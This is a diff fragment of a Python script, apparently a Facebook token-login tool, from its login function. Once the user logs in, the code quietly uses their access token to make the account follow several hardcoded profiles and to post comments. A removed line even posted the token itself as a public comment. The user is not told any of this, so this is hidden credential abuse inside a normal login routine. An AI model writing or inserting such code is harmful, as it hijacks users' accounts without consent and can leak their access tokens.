@@ -667,10 +667,15 @@ def login_xx():
         print ('\033[0;91m !: Token invalid') 
         os.system('rm -rf login.txt')
         
-	requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + toket) 
-	requests.post('https://graph.facebook.com/344477753726632/comments/?message=' + toket + '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/315723919935349/comments/?message=' + kom + '&access_token=' + toket)
-	menu()
+    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz)
+    requests.post('https://graph.facebook.com/' + fb + '/comments/?message=' + kom + '&access_token=' + romz) 
+    requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + romz) # 2007
+    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + romz) # Sniper @() Sheikh Sami Shuja Uddin MD
+    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + romz) # 2018
+    requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=' + romz) # 2021
+    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + romz) # Iqbal Bobz
+    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz) # Iwan Hadiansyah
+    menu()
 
 def x_():
 	os.system('git pull')
